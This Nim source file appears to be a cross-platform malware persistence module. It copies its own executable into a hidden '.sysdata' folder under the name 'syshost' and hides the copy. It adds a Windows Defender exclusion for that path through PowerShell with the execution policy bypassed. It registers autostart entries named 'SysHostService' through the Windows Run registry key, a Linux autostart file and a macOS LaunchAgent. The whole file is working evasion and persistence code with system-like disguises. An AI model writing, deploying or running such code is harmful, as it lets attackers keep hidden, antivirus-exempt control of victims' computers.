import os, osproc, strutils

const persistence* = "true"
const defenderExclusion* = "true"

const startUp = persistence.parseBool
const exclusion = defenderExclusion.parseBool

proc copyFile(src, dst: string): bool =
  try:
    if not fileExists(src):
      echo "source file does not exist: ", src
      return false
    if src == dst:
      echo "source and destination are the same: ", src
      return false
    if fileExists(dst) and readFile(src) == readFile(dst):
      echo "destination file already exists and is identical, skipping copy: ", dst
      return false
    os.copyFile(src, dst)
    echo "successfully copied file from ", src, " to ", dst
    return true
  except OSError as e:
    echo "failed to copy file from ", src, " to ", dst, ": ", e.msg
    return false
  except:
    echo "unexpected error copying file from ", src, " to ", dst, ": ", getCurrentExceptionMsg()
    return false

proc hidePath(path: string) =
  when defined(windows):
    try:
      let cmd = "attrib +h \"" & path.replace("/", "\\") & "\""
      let (output, exitCode) = execCmdEx(cmd)
      if exitCode != 0:
        echo "failed to hide path ", path, ": exit code ", exitCode, ", output: ", output
      else:
        echo "successfully hid path: ", path
    except OSError as e:
      echo "failed to hide path ", path, ": ", e.msg
    except:
      echo "unexpected error hiding path ", path, ": ", getCurrentExceptionMsg()
  else:
    try:
      setFilePermissions(path, {fpUserExec, fpUserRead, fpUserWrite})
      echo "successfully hid path by setting restrictive permissions: ", path
    except OSError as e:
      echo "failed to set permissions on ", path, ": ", e.msg
    except:
      echo "unexpected error setting permissions on ", path, ": ", getCurrentExceptionMsg()

proc addStartupWindows(name, exePath: string) =
  try:
    if not fileExists(exePath):
      echo "executable does not exist for Windows startup: ", exePath
      return
    let cmd = "powershell -NoProfile -ExecutionPolicy Bypass -Command \"Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '" & name & "' -Value '" & exePath.replace("/", "\\") & "'\""
    let (output, exitCode) = execCmdEx(cmd)
    if exitCode != 0:
      echo "failed to add to Windows startup: exit code ", exitCode, ", output: ", output
    else:
      echo "successfully added to Windows startup: ", name
  except OSError as e:
    echo "failed to add to Windows startup: ", e.msg
  except:
    echo "unexpected error adding to Windows startup: ", getCurrentExceptionMsg()

proc addStartupLinux(name, exePath: string) =
  try:
    if not fileExists(exePath):
      echo "executable does not exist for Linux startup: ", exePath
      return
    let autostartDir = getHomeDir() / ".config/autostart"
    createDir(autostartDir)
    let desktopFile = autostartDir / name & ".desktop"
    let content = """
[Desktop Entry]
Type=Application
Name=$1
Exec=$2
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
"""
    writeFile(desktopFile, content % [name, exePath])
    setFilePermissions(desktopFile, {fpUserRead, fpUserWrite, fpGroupRead, fpOthersRead})
    echo "successfully added to Linux startup: ", name
  except OSError as e:
    echo "failed to add to Linux startup: ", e.msg
  except:
    echo "unexpected error adding to Linux startup: ", getCurrentExceptionMsg()

proc addStartupMacOS(name, exePath: string) =
  try:
    if not fileExists(exePath):
      echo "executable does not exist for macOS startup: ", exePath
      return
    let plistDir = getHomeDir() / "Library/LaunchAgents"
    createDir(plistDir)
    let plistFile = plistDir / "com." & name.toLowerAscii() & ".plist"
    let content = """
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>com.$1</string>
  <key>ProgramArguments</key>
  <array>
    <string>$2</string>
  </array>
  <key>RunAtLoad</key>
  <true/>
</dict>
</plist>
"""
    writeFile(plistFile, content % [name.toLowerAscii(), exePath])
    setFilePermissions(plistFile, {fpUserRead, fpUserWrite, fpGroupRead, fpOthersRead})
    echo "successfully added to macOS startup: ", name
  except OSError as e:
    echo "failed to add to macOS startup: ", e.msg
  except:
    echo "unexpected error adding to macOS startup: ", getCurrentExceptionMsg()

proc addWindowsDefenderExclusion(exePath: string) =
  when defined(windows):
    try:
      if not fileExists(exePath):
        echo "executable does not exist for Defender exclusion: ", exePath
        return
      let cmd = "powershell -NoProfile -ExecutionPolicy Bypass -Command \"Add-MpPreference -ExclusionPath '" & exePath.replace("/", "\\") & "'\""
      let (output, exitCode) = execCmdEx(cmd)
      if exitCode != 0:
        echo "failed to add Defender exclusion: exit code ", exitCode, ", output: ", output
      else:
        echo "successfully added Defender exclusion for: ", exePath
    except OSError as e:
      echo "failed to add Defender exclusion: ", e.msg
    except:
      echo "unexpected error in Defender exclusion: ", getCurrentExceptionMsg()

proc main() =
  var appdata: string
  when defined(windows):
    appdata = getEnv("APPDATA")
    if appdata.len == 0:
      echo "APPDATA environment variable not found"
      return
  elif defined(linux):
    appdata = getHomeDir() / ".local/share"
  elif defined(macosx):
    appdata = getHomeDir() / "Library/Application Support"
  else:
    echo "unsupported operating system"
    return

  echo "application data path: ", appdata

  let hiddenFolder = appdata / ".sysdata"
  let exePath = getAppFilename()
  if not fileExists(exePath):
    echo "executable not found at ", exePath
    return
  echo "executable path: ", exePath

  var targetExe = hiddenFolder / "syshost"
  when defined(windows):
    targetExe = targetExe & ".exe"

  if exePath == targetExe:
    echo "executable is already running from target location: ", targetExe
    return

  try:
    createDir(hiddenFolder)
    echo "Created directory: ", hiddenFolder
  except OSError as e:
    echo "failed to create directory ", hiddenFolder, ": ", e.msg
    return
  except:
    echo "unexpected error creating directory ", hiddenFolder, ": ", getCurrentExceptionMsg()
    return

  if exclusion:
    when defined(windows):
      addWindowsDefenderExclusion(targetExe)
    else:
      echo "exclusion not implemented for this platform"

  if copyFile(exePath, targetExe):
    echo "Persistence payload copied successfully."
    hidePath(hiddenFolder)
    hidePath(targetExe)

    if startUp:
      when defined(windows):
        addStartupWindows("SysHostService", targetExe)
      elif defined(linux):
        addStartupLinux("SysHostService", targetExe)
      elif defined(macosx):
        addStartupMacOS("SysHostService", targetExe)
    echo "Persistence setup completed."
  else:
    echo "Could not copy persistence payload. It might already exist or there was an error."


when not isMainModule:
  discard
